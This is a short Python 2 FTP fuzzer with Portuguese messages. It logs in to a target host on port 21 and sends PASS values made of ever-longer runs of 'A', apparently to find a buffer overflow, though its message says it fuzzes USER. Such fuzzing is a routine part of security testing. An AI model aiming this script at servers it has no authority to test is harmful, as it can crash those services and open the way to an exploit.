#!/bin/python
import socket, time, sys

buffer = ["A"]
contador = 100
while len(buffer) <= 30:
	buffer.append("A" * contador)
	contador += 200

for string in buffer:
	print "Fuzzing FTP USER com %s bytes" %len(string)
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	s.connect((sys.argv[1], 21))
	time.sleep(2)
	s.recv(4096)
	s.send("USER teste\r\n")
	r = s.recv(2048)
	s.send("PASS "+string+"\r\n")
	r = s.recv(2048)

